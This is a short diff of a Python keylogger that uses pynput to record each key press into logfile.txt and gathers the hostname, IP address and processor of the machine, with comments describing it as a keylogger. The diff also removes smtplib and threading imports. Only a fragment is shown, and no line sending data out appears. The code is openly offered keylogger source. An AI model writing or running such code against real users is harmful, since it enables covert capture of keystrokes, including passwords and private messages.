@@ -1,11 +1,10 @@
+# Imports 
 import platform 
-import smtplib
 import socket
-import threading 
-
 from pynput import keyboard
 from pynput.keyboard import Listener
 
+#Function to get keys when pressed 
 def KeyPressed(key):
     print(str(key))
     with open('logfile.txt','a') as LogKey:
@@ -18,6 +17,7 @@ def KeyPressed(key):
     
 
 if __name__=="__main__":
+    #Get All System info of person running keylogger
     hostname = socket.gethostname()
     ip = socket.gethostbyname(hostname)
     plat = platform.processor()
